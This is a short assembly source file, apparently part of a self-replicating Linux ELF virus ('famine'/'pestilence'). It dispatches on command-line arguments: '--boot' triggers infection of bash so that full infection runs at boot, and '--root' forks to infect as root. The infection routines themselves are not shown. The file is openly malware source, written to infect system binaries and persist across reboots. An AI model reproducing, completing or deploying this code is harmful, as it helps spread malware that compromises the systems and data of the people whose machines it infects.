%define FAMINE_OPTIONS_S
%include "pestilence.lst"

section .text
	global _famine_start_options

_activate_start_infection:
	.string db '--boot', 0
	.len equ $ - _activate_start_infection.string

_activate_root_infection:
	.string db '--root', 0
	.len equ $ - _activate_root_infection.string

_famine_start_options: ; dispatch according to arguments. famine binary only !!
	mov rax, QWORD [rsp + 136]
	cmp rax, 2
	jne _continue_normaly ; if their is only 2 args, we just infect normally

_test_options:
;   here we check the differents values, and redirect according to it
;; first we check if --boot is set
	mov rdi, QWORD [rsp + 152]
	mov rcx, _activate_start_infection.len
	lea rsi, [rel _activate_start_infection.string]
	cld
	repe cmpsb
	je _start_infect ; infect bash, to run total infection at boot time

;; check if --root is set
	mov rdi, QWORD [rsp + 152]
	mov rcx, _activate_root_infection.len
	lea rsi, [rel _activate_root_infection.string]
	cld
	repe cmpsb
	lea rdi, [rel _exit_properly]
	je _fork_before_infect_root ; infect from root
	jmp _fork_before_exec_normaly ; no arguments corresponds, so simply run normally.

%undef FAMINE_OPTIONS_S
